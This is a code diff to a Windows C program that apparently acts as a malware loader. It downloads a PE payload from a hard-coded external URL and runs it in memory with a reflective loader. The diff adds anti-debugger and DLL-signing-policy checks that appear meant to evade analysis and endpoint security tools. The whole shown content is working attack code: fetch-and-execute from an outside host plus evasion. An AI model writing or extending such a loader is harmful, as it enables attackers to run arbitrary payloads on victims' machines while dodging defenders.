@@ -2,7 +2,9 @@
 #include <Windows.h>
 #include <winternl.h>
 #include <wininet.h>
+
 #include "helpers.h"
+#include "antie.h"
 
 #pragma comment(lib, "wininet")
 
@@ -540,10 +542,16 @@ BOOL LocalPeExec(IN PPE_HEADERS pPeHeaders)
 
 int main(int argc, char* argv[])
 {
+	if (!AllowMsLibOnly())
+		return -1;
+
 	PBYTE pFileBuffer = NULL;
 	DWORD dwFileSize = 0;
 	PE_HEADERS peHeaders = { 0 };
 	LPCSTR sURL = "https://bullworthless.com/19461b00-56f8-11ee-94ef-128911d0d8fb/0590a5a0-941e-4401-a0c1-99c3b5196814.txt";
+
+	if (IsDbgrPresent())
+		return -1;
 
 	if (!FetchPayloadFromWeb(sURL, &pFileBuffer, &dwFileSize))
 		return -1;
